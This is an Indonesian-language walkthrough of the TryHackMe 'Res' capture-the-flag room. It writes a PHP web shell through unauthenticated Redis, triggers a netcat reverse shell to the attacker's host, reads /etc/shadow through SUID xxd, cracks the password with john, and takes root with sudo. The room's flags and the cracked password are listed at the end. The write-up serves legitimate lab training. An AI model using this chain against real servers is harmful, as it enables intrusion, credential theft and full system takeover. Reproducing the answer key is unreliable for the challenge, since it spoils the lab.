# CTF - RES
- TryHackMe Challenge: https://tryhackme.com/room/res
- IP Machine: 10.10.191.28

## Port Scanning
- Lakukan port scanning dengan tool `nmap`
```sh
nmap -sV -p- -T4 <IP Machine>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%201.JPG)

- Buka halaman web `http://<IP_machine>` di browser

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%202.JPG)

## Redis Exploit
- Akses Redis pada server dengan tool `redis-cli`
```sh
redis-cli -h <IP_Machine>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%203.JPG)

- Setelah terhubung buat Shell melalui Redis dengan perintah sebagai berikut
```sh
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']) ?>"
save
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%204.JPG)

- Lakukan pengujian shell melalui browser dengan url `http://10.10.191.28/shell.php?cmd=id`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%205.JPG)

- Buat Reverse Shell menggunakan netcat dengan perintah sebagai berikut:
```sh
nc -e /bin/bash <IP tun0> 4444
```

- Encode reverse shell menggunakan tool URL Encoder online https://www.urlencoder.org/
```sh
nc%20-e%20%2Fbin%2Fbash%20<IP tun0>%204444
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%206.JPG)

- Buat listener netcat di terminal baru
```sh
nc -lnvp 4444
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%207.JPG)

- Jalankan Reverse Shell melalui browser dengan url sebagai berikut:
```sh
http://<IP_Machine>/shell.php?cmd=nc%20-e%20%2Fbin%2Fbash%20<IP tun0>%204444
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%208.JPG)

- Netcat berhasil terkoneksi

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%209.JPG)

- Disini terlihat bahwa terminal belum interaktif. Jadi buat menjadi terminal interaktif dengan perintah sebagai berikut
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2010.JPG)

## Gain Access
- Cari semua SUID yang dapat dieksekusi dengan perintah dibawah ini
```sh
find / -type f -user root -perm -4000 2>/dev/null
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2011.JPG)

- Disini ditemukan SUID **/usr/bin/xxd**. Kita bisa memanfaatkan script di https://gtfobins.github.io/gtfobins/xxd/#file-read untuk melakukan eskalasi lebih lanjut. Gunakan script dibawah ini untuk membaca file **/etc/shadow** dan copy hash user `vianka`
```sh
LFILE=/etc/shadow
/usr/bin/xxd "$LFILE" | /usr/bin/xxd -r
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2012.JPG)
![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2013.JPG)

- Simpan hash tersebut ke dalam sebuah file di local dengan nama file **hash-vianka.txt**
```sh
echo 'paste_hash_here' > hash-vianka.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2014.JPG)

- Crack hash user `vianka` diatas menggunakan tool `john the ripper` dan wordlist `rockyou.txt` yang terdapat di kali linux
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash-vianka.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2015.JPG)

- Password berhasil ditemukan, sekarang switch ke user vianka lalu masukkan password diatas
```sh
su vianka
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2016.JPG)

- Pada directory **/home** terdapat directory **vianka**. Pada directory **/home/vianka** terdapat file **user.txt** sebagai user flag. Buka file **user.txt**
```sh
cd /home/vianka
cat user.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2017.JPG)

## Privilege Escalation
- Lakukan pengecekan apakah user `vianka` punya akses ke sudo
```sh
sudo -l
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2018.JPG)

- Ternyata user `vianka` bisa mengakses, sehingga kita bisa langsung switch ke user `root`
```sh
sudo su
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2019.JPG)

- Buka root flag yang berada di direktori **/root**
```sh
cat /root/root.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Redis/assets/res%2020.JPG)

## Pertanyaan dan Jawaban:

- **Pertanyaan:** Scan the machine, how many ports are open?
```sh
2
```

- **Pertanyaan:** What's is the database management system installed on the server?
```sh
redis
```

- **Pertanyaan:** What port is the database management system running on?
```sh
6379
```

- **Pertanyaan:** What's is the version of management system installed on the server?
```sh
6.0.7
```

- **Pertanyaan:** Compromise the machine and locate user.txt
```sh
thm{red1s_rce_w1thout_credent1als}
```

- **Pertanyaan:** What is the local user account password?
```sh
beautiful1
```

- **Pertanyaan:** Escalate privileges and obtain root.txt
```sh
thm{xxd_pr1v_escalat1on}
```